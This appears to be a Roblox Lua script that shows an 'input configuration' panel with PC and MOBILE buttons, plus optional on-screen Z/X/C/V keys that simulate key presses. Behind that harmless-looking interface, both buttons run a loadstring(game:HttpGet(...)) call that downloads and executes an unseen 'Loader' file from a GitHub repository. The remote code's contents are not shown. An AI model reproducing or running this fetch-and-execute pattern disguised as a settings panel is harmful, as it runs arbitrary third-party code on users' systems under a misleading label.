local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local Keybinds = {"Z", "X", "C", "V"}

local MainGui = Instance.new("ScreenGui")
MainGui.Name = "SystemInputHandler"
MainGui.IgnoreGuiInset = true
MainGui.ResetOnSpawn = false
MainGui.Parent = PlayerGui

local SelectionFrame = Instance.new("Frame")
SelectionFrame.Size = UDim2.new(0, 320, 0, 160)
SelectionFrame.Position = UDim2.new(0.5, -160, 0.5, -80)
SelectionFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
SelectionFrame.BorderSizePixel = 0
SelectionFrame.Active = true
SelectionFrame.Draggable = true
SelectionFrame.Parent = MainGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = SelectionFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "INPUT CONFIGURATION"
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.Font = Enum.Font.RobotoMono
Title.TextSize = 18
Title.Parent = SelectionFrame

local function CreateInterfaceButton(name, pos, color)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 130, 0, 45)
	btn.Position = pos
	btn.BackgroundColor3 = color
	btn.BorderSizePixel = 0
	btn.Text = name
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Font = Enum.Font.RobotoMono
	btn.TextSize = 16
	btn.AutoButtonColor = true
	btn.Parent = SelectionFrame
	
	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 4)
	btnCorner.Parent = btn
	
	return btn
end

local PC_Trigger = CreateInterfaceButton("PC", UDim2.new(0, 20, 0, 70), Color3.fromRGB(45, 45, 45))
local Mobile_Trigger = CreateInterfaceButton("MOBILE", UDim2.new(0, 170, 0, 70), Color3.fromRGB(30, 80, 180))

local function InitMobileOverlay()
	for i, key in ipairs(Keybinds) do
		local keyBtn = Instance.new("TextButton")
		keyBtn.Size = UDim2.new(0, 65, 0, 65)
		keyBtn.Position = UDim2.new(0.75, (i-1) * 75, 0.6, 0)
		keyBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		keyBtn.Text = key
		keyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		keyBtn.Font = Enum.Font.RobotoMono
		keyBtn.TextSize = 22
		keyBtn.Active = true
		keyBtn.Draggable = true
		keyBtn.Parent = MainGui
		
		local kCorner = Instance.new("UICorner")
		kCorner.CornerRadius = UDim.new(0, 8)
		kCorner.Parent = keyBtn
		
		local kStroke = Instance.new("UIStroke")
		kStroke.Color = Color3.fromRGB(60, 60, 60)
		kStroke.Parent = keyBtn

		keyBtn.MouseButton1Down:Connect(function()
			VirtualInputManager:SendKeyEvent(true, Enum.KeyCode[key], false, game)
			keyBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
		end)

		keyBtn.MouseButton1Up:Connect(function()
			VirtualInputManager:SendKeyEvent(false, Enum.KeyCode[key], false, game)
			keyBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		end)
	end
end

local function ExecuteEnvironment()
	SelectionFrame:Destroy()
	
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/asdfgerf51234-hub/testinfg/refs/heads/main/Loader"))()
    
end

PC_Trigger.MouseButton1Click:Connect(ExecuteEnvironment)

Mobile_Trigger.MouseButton1Click:Connect(function()
	InitMobileOverlay()
	ExecuteEnvironment()
end)
